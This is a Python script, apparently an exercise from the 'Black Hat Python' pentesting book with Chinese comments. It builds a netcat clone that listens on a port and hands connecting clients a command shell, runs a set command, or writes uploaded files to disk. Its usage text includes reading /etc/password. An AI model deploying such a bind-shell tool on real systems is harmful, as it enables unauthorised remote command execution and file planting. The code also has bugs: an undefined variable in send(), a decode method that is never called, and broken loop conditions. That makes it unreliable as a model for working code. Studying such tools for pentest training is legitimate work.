import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
'''
Python黑帽子 黑客与渗透测试编程之道
基础网络编程工具
NetCat
'''
class NetCat:
    def __init__(self,args,buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    # 发送数据
    def send(self):
        self.socket.connect((self.args.target,self.args.port))
        if self.buffer:
            self.socket.send(buffer)  # nc = NetCat(args,buffer.encode()) 缓冲区内容已经编码过

        try:
            while True:
                recv_len=1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 1: # 原书中为 < 4096 注意 这里需要修改,如服务端listen发送过来 Enthusiam:#则会导致一直break跳到外面的大循环
                        break
                    if response:
                        print(response)
                        buffer = input('>')
                        buffer += '\n'
                        self.socket.send(buffer.encode())
        except KeyboardInterrupt:
            print('User terminated')
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target,self.args.port))
        self.socket.listen(5)
        print(f'[*] Listening on {self.args.target}:{self.args.port}')
        while True:
            connect,address = self.socket.accept()
            print(f'[*] Accepted connection from {address[0]}:{address[1]}')
            conn_handler = threading.Thread(target=self.handler_connect,args=(connect,))
            conn_handler.start()
    
    def handler_connect(self,connect):
        if self.args.execute:
            output = execute(self.args.execute)
            connect.send(output.encode())
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = connect.recv(4096)
                print(data.decode)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload,'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            connect.send(message.encode())
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    connect.send(b'Enthusiasm:#>')
                    while (('\n' not in cmd_buffer.decode()) and cmd_buffer.decode() == ''):
                        cmd_buffer += connect.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        print()
                        connect.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT,universal_newlines=True)
    #subprocess.check_output():执行成功会检查，执行成功则正常返回执行结果，否则抛出异常，默认返回的是字节，可以添加universal_newlines=True返回正常字符
    #shlex.split():这个函数的作用是将字符串按照shell的语法规则进行分割，返回一个分割后的列表。
    # command = "ls -l -a"
    # args = shlex.split(command)
    # 输出：['ls', '-l', '-a']
    print(output)
    return output

if __name__=='__main__':
    parser = argparse.ArgumentParser(
        description='simple self netcat',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
                               netcat.py -t 192.168.52.128 -p 5555 -l -c                   # command shell                               
                               netcat.py -t 192.168.52.128 -p 5555 -l -u=mytest.txt        # upload to file
                               netcat.py -t 192.168.52.128 -p 5555 -l -e=cat /etc/password # execute command
                               netcat.py -t 192.168.52.128 -p 5555                         # connect to server
        ''')
    )
    parser.add_argument('-c','--command',action='store_true',help='command shell')
    parser.add_argument('-e','--execute',help='execute specified command')
    parser.add_argument('-l','--listen',action='store_true',help='listen')
    parser.add_argument('-p','--port',type=int,default=5555,help='specified port')
    parser.add_argument('-t','--target',default='192.168.93.1',help='specified ip')
    parser.add_argument('-u','--upload',help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ""
    else:
        buffer = sys.stdin.read() # sys.stdin是一个标准化输入的方法 input 等价于sys.stdin.readline() 
                                  # 运行sys.stdin.read()代码时终端会不停地处于输入状态linux系统 使用ctrl+D

    nc = NetCat(args,buffer.encode())
    nc.run()
